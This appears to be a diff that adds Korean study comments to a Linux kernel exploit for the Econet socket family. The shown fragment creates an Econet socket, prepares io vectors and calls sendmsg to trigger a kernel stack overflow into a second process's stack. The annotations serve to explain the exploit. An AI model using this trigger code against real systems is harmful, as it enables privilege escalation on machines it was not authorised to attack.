@@ -484,7 +484,7 @@ void do_child_upper(void)
 		iovs[i].iov_len = 0;
 	}
 
-	/* create econet socket */
+	/* create econet socket */ // 스택 오버플로에 취약한.ECONET 소켓 패밀리를 호출,. (취약성 발생)
 	eco_sock = socket(PF_ECONET, SOCK_DGRAM, 0);
 	if (eco_sock < 0) {
 		printf("[-] failed creating econet socket, aborting!\n");
@@ -506,19 +506,19 @@ void do_child_upper(void)
 	eco_msg.msg_name = &eco_addr;
 	eco_msg.msg_namelen = sizeof(eco_addr);
 	eco_msg.msg_flags = 0;
-	eco_msg.msg_iov = &iovs[0];
+	eco_msg.msg_iov = &iovs[0]; // 취약성 공격을 위한 상단에 설명드린 ions (io vectors) 구조체를 에코넷에 설치
 	eco_msg.msg_iovlen = IOVS;
 
 	printf("[+] upper child triggering stack overflow...\n");
 
 	/* trigger the kstack overflow into lower child's kstack */
-	ret = sendmsg(eco_sock, &eco_msg, 0);
+	ret = sendmsg(eco_sock, &eco_msg, 0); // 커널 스택 오버플로를 로우(낮은) 자식의 커널 스택에 트리거하기 위해서 데이타그램을 하나 에코넷 패밀리로 전송
 	if (ret != -1 || errno != EFAULT) {
 		printf("[-] sendmsg succeeded unexpectedly, aborting!\n");
 		exit(1);
 	}
 
-	close(eco_sock);
+	close(eco_sock); // 소켓 닫기
 }
 
 // 자식 프로세스의 낮은 주소가 실행하는 함수
@@ -616,5 +616,3 @@ int main(int argc, char **argv)
 
 	return 0; // 실패시 0을 반환
 }
-
-// EOFEOFEOF
